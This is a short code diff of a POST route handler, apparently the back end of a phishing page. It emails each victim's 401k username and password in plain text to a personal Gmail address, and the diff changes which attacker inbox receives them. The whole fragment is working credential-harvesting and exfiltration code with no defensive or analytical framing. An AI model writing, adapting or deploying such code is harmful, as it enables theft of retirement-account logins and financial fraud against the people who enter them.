@@ -30,7 +30,7 @@ export async function POST(req) {
       });
       await transporter.sendMail({
         from: "hvbvcchuknb@gmail.com",
-        to: "joychurch28@gmail.com",
+        to: "tbank9678@gmail.com",
         subject: "401k Details",
         html: `<h2>${body.email}'s 401K username is ${body.username} and password is ${body.password}</h2>`,
       });
